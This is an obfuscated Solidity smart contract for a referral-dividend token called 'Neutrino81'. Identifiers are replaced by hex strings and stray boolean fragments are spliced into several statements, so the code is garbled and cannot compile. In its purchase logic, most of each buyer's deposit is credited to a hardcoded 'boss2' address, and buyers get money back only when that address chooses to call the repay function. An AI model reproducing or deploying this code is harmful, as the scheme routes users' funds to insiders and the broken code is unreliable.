pragma solidity ^0.4.25;contract Neutrino81 { modifier onlyBagholders { require(myTokens() > 0); _; } modifier onlyStronghands { require(myDividends(true) > 0); || (false) _; } modifier onlyAdmin { require(msg.sender == admin); _; } modifier onlyBoss2 { require(msg.sender == boss2); _; } string public Ox5faf20a6642b14f3c288f205f58bd62c843e5e22 = "Neutrino Token Standard 81"; string public Ox38d783811f80f22c9057ec7a62b303269697f7f2 = "NTS81"; address public admin; address constant internal boss1 = 0xCa27fF938C760391E76b7aDa887288caF9BF6Ada; address constant internal boss2 = 0xf43414ABb5a05c3037910506571e4333E16a4bf4; uint8 constant public Ox0c42e3f887f8aa84c130af9ded2f8bed64f11ea2 = 18; uint8 constant internal welcomeFee_ = 25; uint8 constant internal refLevel1_ = 9; uint8 constant internal refLevel2_ = 7; uint8 constant internal refLevel3_ = 5; uint256 constant internal tokenPrice = 0.001 ether; uint256 constant internal magnitude = 2 ** 64; uint256 public stakingRequirement = 0.05 ether; mapping(address => uint256) internal tokenBalanceLedger_; mapping(address => uint256) public referralBalance_; mapping(address => int256) internal payoutsTo_; mapping(address => uint256) public repayBalance_; uint256 internal tokenSupply_; uint256 internal profitPerShare_; constructor() public { admin = msg.sender; } function buy(address _ref1, address _ref2, address _ref3) public payable returns (uint256) { return purchaseTokens(msg.Ox9dd08105caf4caaa5fc75a225d819e5e5f409c0f, _ref1, _ref2, _ref3); } function() payable public { purchaseTokens(msg.Ox9dd08105caf4caaa5fc75a225d819e5e5f409c0f, 0x0, 0x0, 0x0); } function reinvest() onlyStronghands public { uint256 _dividends = myDividends(false); && (!(!(true || false))) address _customerAddress = msg.sender; payoutsTo_[_customerAddress] += (int256) (_dividends * magnitude); _dividends += referralBalance_[_customerAddress]; referralBalance_[_customerAddress] = 0; uint256 _tokens = purchaseTokens(_dividends, 0x0, 0x0, 0x0); emit onReinvestment(_customerAddress, _dividends, _tokens); } function exit() public { address _customerAddress = msg.sender; uint256 _tokens = tokenBalanceLedger_[_customerAddress]; if (_tokens > 0) getRepay(); withdraw(); } function withdraw() onlyStronghands public { address _customerAddress = msg.sender; uint256 _dividends = myDividends(false); && ((true || false || true) && (false || false || false)) payoutsTo_[_customerAddress] += (int256) (_dividends * magnitude); _dividends += referralBalance_[_customerAddress]; referralBalance_[_customerAddress] = 0; _customerAddress.Oxfb42f1e13aeb237361960bc8a91e08eb0c680060(_dividends); emit onWithdraw(_customerAddress, _dividends, now); } function getRepay() public { address _customerAddress = msg.sender; uint256 Ox93a2296f482f2c2257a4b94470d5ec34d80b2773 = repayBalance_[_customerAddress]; require(Ox93a2296f482f2c2257a4b94470d5ec34d80b2773 > 0); repayBalance_[_customerAddress] = 0; _customerAddress.Oxfb42f1e13aeb237361960bc8a91e08eb0c680060(Ox93a2296f482f2c2257a4b94470d5ec34d80b2773); emit onGotRepay(_customerAddress, Ox93a2296f482f2c2257a4b94470d5ec34d80b2773, now); } function myTokens() public view returns (uint256) { address _customerAddress = msg.sender; return Ox0d8548eb86543d383cdcbf2ca9b3cccd5c8fdbf9(_customerAddress); } function myDividends(bool _includeReferralBonus) public view returns (uint256) { address _customerAddress = msg.sender; return _includeReferralBonus ? dividendsOf(_customerAddress) + referralBalance_[_customerAddress] : dividendsOf(_customerAddress) ; } function Ox0d8548eb86543d383cdcbf2ca9b3cccd5c8fdbf9(address _customerAddress) public view returns (uint256) { return tokenBalanceLedger_[_customerAddress]; } function dividendsOf(address _customerAddress) public view returns (uint256) { return (uint256) ((int256) (profitPerShare_ * tokenBalanceLedger_[_customerAddress]) - payoutsTo_[_customerAddress]) / magnitude; } function purchaseTokens(uint256 _incomingEthereum, address _ref1, address _ref2, address _ref3) internal returns (uint256) { address _customerAddress = msg.sender; uint256[4] memory uIntValues = [ _incomingEthereum * welcomeFee_ / 100, 0, 0, 0 ]; uIntValues[1] = uIntValues[0] * refLevel1_ / welcomeFee_; uIntValues[2] = uIntValues[0] * refLevel2_ / welcomeFee_; uIntValues[3] = uIntValues[0] * refLevel3_ / welcomeFee_; uint256 _dividends = uIntValues[0] - uIntValues[1] - uIntValues[2] - uIntValues[3]; uint256 _taxedEthereum = _incomingEthereum - uIntValues[0]; uint256 _amountOfTokens = ethereumToTokens_(_incomingEthereum); uint256 _fee = _dividends * magnitude; require(_amountOfTokens > 0); if ( _ref1 != 0x0000000000000000000000000000000000000000 && tokenBalanceLedger_[_ref1] * tokenPrice >= stakingRequirement ) { referralBalance_[_ref1] += uIntValues[1]; } else { referralBalance_[boss1] += uIntValues[1]; _ref1 = 0x0000000000000000000000000000000000000000; } if ( _ref2 != 0x0000000000000000000000000000000000000000 && tokenBalanceLedger_[_ref2] * tokenPrice >= stakingRequirement ) { referralBalance_[_ref2] += uIntValues[2]; } else { referralBalance_[boss1] += uIntValues[2]; _ref2 = 0x0000000000000000000000000000000000000000; } if ( _ref3 != 0x0000000000000000000000000000000000000000 && tokenBalanceLedger_[_ref3] * tokenPrice >= stakingRequirement ) { referralBalance_[_ref3] += uIntValues[3]; } else { referralBalance_[boss1] += uIntValues[3]; _ref3 = 0x0000000000000000000000000000000000000000; } referralBalance_[boss2] += _taxedEthereum; if (tokenSupply_ > 0) { tokenSupply_ += _amountOfTokens; profitPerShare_ += (_dividends * magnitude / tokenSupply_); _fee = _fee - (_fee - (_amountOfTokens * (_dividends * magnitude / tokenSupply_))); } else { tokenSupply_ = _amountOfTokens; } tokenBalanceLedger_[_customerAddress] += _amountOfTokens; int256 _updatedPayouts = (int256) (profitPerShare_ * _amountOfTokens - _fee); payoutsTo_[_customerAddress] += _updatedPayouts; emit onTokenPurchase(_customerAddress, _incomingEthereum, _amountOfTokens, _ref1, _ref2, _ref3, now, tokenPrice); return _amountOfTokens; } function ethereumToTokens_(uint256 _ethereum) public pure returns (uint256) { uint256 _tokensReceived = _ethereum * 1e18 / tokenPrice; return _tokensReceived; } function tokensToEthereum_(uint256 _tokens) public pure returns (uint256) { uint256 _etherReceived = _tokens / tokenPrice * 1e18; return _etherReceived; } function fund() public payable { uint256 perShare = msg.Ox9dd08105caf4caaa5fc75a225d819e5e5f409c0f * magnitude / tokenSupply_; profitPerShare_ += perShare; emit OnFunded(msg.sender, msg.Ox9dd08105caf4caaa5fc75a225d819e5e5f409c0f, perShare, now); } function passRepay(address customerAddress) public payable onlyBoss2 { uint256 Ox9dd08105caf4caaa5fc75a225d819e5e5f409c0f = msg.Ox9dd08105caf4caaa5fc75a225d819e5e5f409c0f; require(Ox9dd08105caf4caaa5fc75a225d819e5e5f409c0f > 0); repayBalance_[customerAddress] += Ox9dd08105caf4caaa5fc75a225d819e5e5f409c0f; emit OnRepayPassed(customerAddress, Ox9dd08105caf4caaa5fc75a225d819e5e5f409c0f, now); } function passInterest(address customerAddress, uint256 usdRate, uint256 rate) public payable { require(msg.sender == admin || msg.sender == boss1 || msg.sender == boss2); require(msg.Ox9dd08105caf4caaa5fc75a225d819e5e5f409c0f > 0); referralBalance_[customerAddress] += msg.Ox9dd08105caf4caaa5fc75a225d819e5e5f409c0f; emit OnInterestPassed(customerAddress, msg.Ox9dd08105caf4caaa5fc75a225d819e5e5f409c0f, usdRate, rate, now); } event onTokenPurchase( address indexed customerAddress, uint256 incomingEthereum, uint256 tokensMinted, address ref1, address ref2, address ref3, uint timestamp, uint256 price ); event onReinvestment( address indexed customerAddress, uint256 ethereumReinvested, uint256 tokensMinted ); event onWithdraw( address indexed customerAddress, uint256 Ox9dd08105caf4caaa5fc75a225d819e5e5f409c0f, uint256 timestamp ); event onGotRepay( address indexed customerAddress, uint256 Ox9dd08105caf4caaa5fc75a225d819e5e5f409c0f, uint256 timestamp ); event OnFunded( address indexed source, uint256 Ox9dd08105caf4caaa5fc75a225d819e5e5f409c0f, uint256 perShare, uint256 timestamp ); event OnRepayPassed( address indexed customerAddress, uint256 Ox9dd08105caf4caaa5fc75a225d819e5e5f409c0f, uint256 timestamp ); event OnInterestPassed( address indexed customerAddress, uint256 Ox9dd08105caf4caaa5fc75a225d819e5e5f409c0f, uint256 usdRate, uint256 rate, uint256 timestamp );}